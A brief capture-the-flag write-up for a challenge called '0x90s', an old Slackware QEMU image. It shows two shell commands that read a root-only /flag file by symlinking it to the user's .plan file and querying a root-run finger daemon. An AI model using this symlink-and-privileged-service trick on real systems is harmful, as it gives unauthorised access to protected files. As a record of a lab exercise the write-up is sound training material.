0x90s
=====

0x90s was a qemu image of an old slackware install. After logging in with the supplied credentials (`challenge/challenge`) you quickly found the flag in the / directory but without the permissions to access it. While looking around for something to exploit I noticed finger running with root privileges.

`$ ln -s /flag /home/challenge/.plan
$ finger -l challenge@localhost`
